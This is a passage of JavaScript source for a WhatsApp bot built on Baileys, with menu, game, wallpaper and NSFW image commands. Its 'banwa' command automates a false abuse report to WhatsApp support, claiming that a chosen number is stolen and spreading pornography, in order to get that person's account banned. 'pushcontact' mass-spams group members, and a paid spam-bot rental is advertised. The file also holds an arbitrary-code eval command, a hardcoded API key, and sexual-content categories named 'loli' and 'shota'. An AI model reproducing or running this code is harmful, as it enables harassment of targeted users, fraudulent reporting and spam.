fs.writeFileSync("./database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await Kyuu.sendMessage(sender, { document: fs.readFileSync("./database/contacts.vcf"), fileName: "contacts.vcf", caption: "Sukses Tinggal Save Ya Kakak", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./database/contacts.json", JSON.stringify(contacts))
}
}
break
case 'menu': {
 	       let ownernya = ownernomer + '@s.whatsapp.net'
            let me = m.sender
            let timestampe = speed();
            let latensie = speed() - timestampe
            xeonezy = `Hi, ${pushname} 👋 I am a WhatsApp bot that works using baileys v6.0.9
Hopefully you can use me wisely and well

*I N F O - B O T*

*┌ Bot Name* : *${global.botname}*
*│ Version* : *5*
*│ Running* : *${global.running}*
*│ Language* : *NodeJs*
*└ Baileys* : *@adiwashing/baileys*
 
*L I S T - M E N U*

*┌ ◦ .idgc*
*│ ◦ .pushcontact*
*│ ◦ .pushcontactv2*
*│ ◦ .savecontact*
*│ ◦ .remini*
*│ ◦ .sewabot*
*└ ◦ .qc*

found a bug?
please report the developer 
contact the owner *.owner*

Powered By *@${mark.split("@")[0]}*`
            let ments = [ownernya, me, mark]        
           Kyuu.sendMessage(from, { 
text: xeonezy,
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
mentionedJid:[sender, mark],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title":wmbot, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./XeonMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
}, { quoted: m })
           }
           break
case 'sewabot': {
 	       let ownernya = ownernomer + '@s.whatsapp.net'
            let me = m.sender
            let timestampe = speed();
            let latensie = speed() - timestampe
            xeonezy = `Hi, ${pushname} 👋 
 
*OPEN SEWA BOT PUSHKONTAK SV OTOMATIS TANPA SCAN*

*OPEN SEWA BOT NO SCAN/TANPA SCAN*
-ANTI KENON
-ANTI DELAY
-ANTI ERROR
-SV OTOMATIS
*HARGA CUMAN 2K😱😱😱*

MINAT CHAT wa.me/6285743137623

Powered By *@${mark.split("@")[0]}*`
            let ments = [ownernya, me, mark]        
           Kyuu.sendMessage(from, { 
text: xeonezy,
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
mentionedJid:[sender, mark],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title":wmbot, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./XeonMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
}, { quoted: m })
           }
           break
//=================================================//
case 'tebak': {
 if (!text) throw `Example : ${prefix + command} lagu\n\nOption : \n1. lagu\n2. gambar\n3. kata\n4. kalimat\n5. lirik\n6.lontong`
 if (args[0] === "lagu") {
 if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await JSON.parse(fs.readFileSync('./lib/tebaklagu.json'));
 let result = anu[Math.floor(Math.random() * anu.length)]
 let msg = await Kyuu.sendMessage(from, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, {quoted:m})
 Kyuu.sendText(from, `Lagu Tersebut Adalah Lagu dari?\n\nArtist : ${result.artist}\nWaktu : 60s`, msg).then(() => {
 tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(3000)
 if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 Kyuu.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/297a0ffd35ca495c710b0.jpg' }, caption:`Waktu Habis\nJawaban:  ${tebaklagu[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak lagu`},{quoted:m}) 
 delete tebaklagu[m.sender.split('@')[0]]
 }
 } else if (args[0] === 'gambar') {
 if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 Kyuu.sendImage(from, result.img, `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : 60s`, m).then(() => {
 tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(3000)
 if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 Kyuu.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/297a0ffd35ca495c710b0.jpg' }, caption: `Waktu Habis\nJawaban:  ${tebakgambar[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak gambar`}, {quoted:m}) 
 delete tebakgambar[m.sender.split('@')[0]]
 }
 } else if (args[0] === 'kata') {
 if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 Kyuu.sendText(from, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
 tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(3000)
 if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 Kyuu.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/297a0ffd35ca495c710b0.jpg' }, caption: `Waktu Habis\nJawaban:  ${tebakkata[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak kata` }, {quoted:m}) 
 delete tebakkata[m.sender.split('@')[0]]
 }
 } else if (args[0] === 'kalimat') {
 if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 Kyuu.sendText(from, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
 tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(3000)
 if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 Kyuu.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/297a0ffd35ca495c710b0.jpg' }, caption:`Waktu Habis\nJawaban:  ${tebakkalimat[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak kalimat`}, {quoted:m}) 
 delete tebakkalimat[m.sender.split('@')[0]]
 }
 } else if (args[0] === 'lirik') {
 if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 Kyuu.sendText(from, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
 tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(3000)
 if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 Kyuu.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/297a0ffd35ca495c710b0.jpg' }, caption: `Waktu Habis\nJawaban:  ${tebaklirik[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak lirik`} , {quoted:m}) 
 delete tebaklirik[m.sender.split('@')[0]]
 }
 } else if (args[0] === 'lontong') {
 if (caklontong.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 Kyuu.sendText(from, `*Jawablah Pertanyaan Berikut :*\n${result.soal}*\nWaktu : 60s`, m).then(() => {
 caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
 })
 await sleep(3000)
 if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 Kyuu.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/297a0ffd35ca495c710b0.jpg' }, caption:`Waktu Habis\nJawaban:  ${caklontong[m.sender.split('@')[0]]}\nDeskripsi : ${caklontong_desk[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak lontong`}, {quoted:m}) 
 delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
 }
 }
}
break
case 'woof':
case '8ball':
case 'goose':
case 'gecg':
case 'feed':
case 'avatar':
case 'lizard':
case 'meow':
case 'tickle':
replygcxeon(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
            await Kyuu.sendMessage(m.chat,{ caption: mess.success, image: {url:waifudd.data.url} },{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animewallpaper2': case 'animewall2': {
                if (!args.join(" ")) return replygcxeon("What wallpaper are you looking for??")
		let { wallpaper } = require('./lib/scraperW')
                anu = await wallpaper(args)
                result = anu[Math.floor(Math.random() * anu.length)]
                Kyuu.sendMessage(m.chat, { caption: `Title : ${result.title}\nCategory : ${result.type}\nDetail : ${result.source}\nMedia Url : ${result.image[2] || result.image[1] || result.image[0]}`, image: { url: result.image[0] } } , { quoted: m })
            }
            break
case 'animewall': case 'animewallpaper':
const { AnimeWallpaper } =require("anime-wallpaper")
if(!q) return replygcxeon('What wallpaper do you want?')
replygcxeon(mess.wait)
const wall = new AnimeWallpaper();
    const pages = [1,2,3,4];
        const random=pages[Math.floor(Math.random() * pages.length)]
        const wallpaper = await wall
            .getAnimeWall4({ title: q, type: "sfw", page: pages })
            .catch(() => null);
const i = Math.floor(Math.random() * wallpaper.length);     
            await Kyuu.sendMessage(m.chat, { caption: `*Query :* ${q}`, image: {url:wallpaper[i].image} }, { quoted: m} ).catch(err => {
                    return('Error!')
                })
//Kyuu.sendMessage(m.chat,{image:{url:wallpaper[i].image},caption:`*Query :* ${q}`})            
break
case 'akira': case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elaina': case 'emilia': case 'erza': case 'exo':  case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'hinata': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'loli': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'minato': case 'mountain': case 'naruto': case 'neko': case 'neko2': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming':  case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 'waifu': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{
if (!isPrem) return replyprem(mess.premium)
replygcxeon(mess.wait)
let heyy
if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akira.json')
if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akiyama.json')
if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ana.json')
if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/art.json')
if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/asuna.json')
if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ayuzawa.json')
if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boneka.json')
if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boruto.json')
if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/bts.json')
if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cecan.json')
if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chiho.json')
if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chitoge.json')
if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cogan.json')
if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplay.json')
if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplayloli.json')
if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplaysagiri.json')
if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cyber.json')
if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/deidara.json')
if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/doraemon.json')
if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/eba.json')
if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/elaina.json')
if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/emilia.json')
if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/erza.json')
if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/exo.json')
if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/femdom.json')
if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/freefire.json')
if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gamewallpaper.json')
if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/glasses.json')
if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gremory.json')
if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hekel.json')
if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hestia.json')
if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/husbu.json')
if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/inori.json')
if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/islamic.json')
if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/isuzu.json')
if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itachi.json')
if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itori.json')
if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jeni.json')
if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jiso.json')
if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/justina.json')
if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaga.json')
if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kagura.json')
if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kakasih.json')
if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaori.json')
if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kartun.json')
if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/katakata.json')
if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/keneki.json')
if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kotori.json')
if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kpop.json')
if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kucing.json')
if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kurumi.json')
if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/lisa.json')
if (/loli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/loli.json')
if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/madara.json')
if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/megumin.json')
if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikasa.json')
if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikey.json')
if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/miku.json')
if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/minato.json')
if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mobil.json')
if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/motor.json')
if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mountain.json')
if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/naruto.json')
if (/neko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko.json')
if (/neko2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko2.json')
if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nekonime.json')
if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nezuko.json')
if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/onepiece.json')
if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pentol.json')
if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pokemon.json')
if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/profil.json')
if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/programming.json')
if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pubg.json')
if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randblackpink.json')
if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime.json')
if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime2.json')
if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rize.json')
if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rose.json')
if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ryujin.json')
if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sagiri.json')
if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sakura.json')
if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sasuke.json')
if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/satanic.json')
if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shina.json')
if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinka.json')
if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinomiya.json')
if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shizuka.json')
if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shota.json')
if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tatasurya.json')
if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/technology.json')
if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tejina.json')
if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/toukachan.json')
if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tsunade.json')
if (/waifu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/waifu.json')
if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallhp.json')
if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallml.json')
if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallnime.json')
if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yotsuba.json')
if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yuki.json')
if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yulibocil.json')
if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yumeko.json')
let yeha = heyy[Math.floor(Math.random() * heyy.length)];
Kyuu.sendMessage(m.chat, { image: { url: yeha }, caption : mess.success }, { quoted: m })
}
break
case '>':
case '=>':
if (!XeonTheCreator) return;
var err = new TypeError;
err.name = "EvalError "
err.message = "Code Not Found (404)"
if (!q) return replygcxeon(util.format(err))
var arg = command == ">" ? args.join(" ") : "return " + args.join(" ")
try {
var txtes = util.format(await eval(`(async()=>{ ${arg} })()`))
replygcxeon(txtes)
} catch(e) {
let _syntax = ""
let _err = util.format(e)
let err = syntaxerror(arg, "EvalError", {
allowReturnOutsideFunction: true,
allowAwaitOutsideFunction: true,
sourceType: "commonjs"
})
if (err) _syntax = err + "\n\n"
replygcxeon(util.format(_syntax + _err))
}
break;
        case 'banwa': {

if (!XeonTheCreator) return 

if (!text) return replygcxeon(`Where's the number?`)

let ntah = await axios.get("https://www.whatsapp.com/contact/noclient/")

let email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10")

let cookie = ntah.headers["set-cookie"].join("; ")

let $ = cheerio.load(ntah.data)

let $form = $("form");

let url = new URL($form.attr("action"), "https://www.whatsapp.com").href

let form = new URLSearchParams()

form.append("jazoest", $form.find("input[name=jazoest]").val())

form.append("lsd", $form.find("input[name=lsd]").val())

form.append("step", "submit")

form.append("country_selector", "ID")

form.append("phone_number", text)

form.append("email", email.data[0])

form.append("email_confirm", email.data[0])

form.append("platform", "ANDROID")

form.append("your_message", `Hello Dear WhatsApp

Good morning/afternoon/night

My WhatsApp Number ${text} Stolen And Now Used to spread pornography and illegal sales, please take immediate action regarding my account.

If you can, just disable it

for important chat matters I don't have it

Thank you`)

form.append("__user", "0")

form.append("__a", "1")

form.append("__csr", "")

form.append("__req", "8")

form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")

form.append("dpr", "1")

form.append("__ccg", "UNKNOWN")

form.append("__rev", "1006630858")

form.append("__comment_req", "0")

let res = await axios({

  url,

  method: "POST",

  data: form,

  headers: {

    cookie

  }

})

replygcxeon(util.format(JSON.parse(res.data.replace("for (;;);", ""))))

}

break
case 'pushcontact': {
    if (!XeonTheCreator) return replygcxeon(mess.owner)
      if (!m.isGroup) return replygcxeon(`The feature works only in grup`)
    if (!text) return replygcxeon(`text?`)
    let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
    replygcxeon(`Success in pushing the message to contacts`)
    for (let pler of mem) {
    Kyuu.sendMessage(pler, { text: q})
     }  
     replygcxeon(`Done`)
      }
      break
            case 'id':{
            replygcxeon(from)
           }
          break
          case 'emojimix': {
		let [emoji1, emoji2] = text.split`+`
		if (!emoji1) return replygcxeon(`Example : ${prefix + command} 😅+🤔`)
		if (!emoji2) return replygcxeon(`Example : ${prefix + command} 😅+🤔`)
		let anumojimix = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
		for (let res of anumojimix.results) {
		    let encmedia = await Kyuu.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    await fs.unlinkSync(encmedia)
		}
	    }
	    break
	case 'hentaivid2': {
if (!m.isGroup) return m.reply(mess.group)
if (!isPrem) return replyprem(mess.premium)
if (!AntiNsfw) return m.reply(mess.nsfw)
replygcxeon(mess.wait)
sbe = await hentaivid()
cejd = sbe[Math.floor(Math.random(), sbe.length)]
Kyuu.sendMessage(m.chat, { video: { url: cejd.video_1 }, 
caption: `⭔ Title : ${cejd.title}
⭔ Category : ${cejd.category}
⭔ Mimetype : ${cejd.type}
⭔ Views : ${cejd.views_count}
⭔ Shares : ${cejd.share_count}
⭔ Source : ${cejd.link}
⭔ Media Url : ${cejd.video_1}` }, { quoted: m })
}
break
	case 'hentaivid': case 'hentaivideo': {
	if (!m.isGroup) return m.reply(mess.group)
if (!AntiNsfw) return m.reply(mess.nsfw)
                m.reply(mess.wait)
                const { hentai } = require('./lib/scraper.js')
                anu = await hentai()
                result912 = anu[Math.floor(Math.random(), anu.length)]
                Kyuu.sendMessage(m.chat, { video: { url: result912.video_1 }, caption: `${themeemoji} Title : ${result912.title}\n${themeemoji} Category : ${result912.category}\n${themeemoji} Mimetype : ${result912.type}\n${themeemoji} Views : ${result912.views_count}\n${themeemoji} Shares : ${result912.share_count}\n${themeemoji} Source : ${result912.link}\n${themeemoji} Media Url : ${result912.video_1}` }, { quoted: m })
            }
            break
case 'trap' :
if (!m.isGroup) return replygcxeon(mess.group)
if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/${command}`)       
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'hentai-neko' :
case 'hneko' :
if (!m.isGroup) return replygcxeon(mess.group)
if (!AntiNsfw) return replygcxeon(mess.nsfw)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'hentai-waifu' :
case 'nwaifu' :
if (!m.isGroup) return replygcxeon(mess.group)
if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`)         
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'gasm':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
